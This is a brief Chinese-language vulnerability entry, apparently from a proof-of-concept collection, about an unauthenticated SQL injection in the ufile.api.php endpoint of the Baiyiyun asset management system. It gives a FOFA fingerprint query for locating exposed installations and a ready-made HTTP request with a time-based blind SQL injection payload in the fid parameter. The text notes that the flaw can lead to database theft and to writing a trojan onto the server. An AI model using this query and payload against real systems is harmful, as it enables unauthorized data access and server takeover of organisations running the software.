# 百易云资产管理运营系统ufile.api.php存在SQL注入漏洞

百易云资产管理运营系统ufile.api.php存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
body="不要着急，点此"
```

## poc

```javascript
GET /api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(2)))UPCw) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

![](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410231039295.png)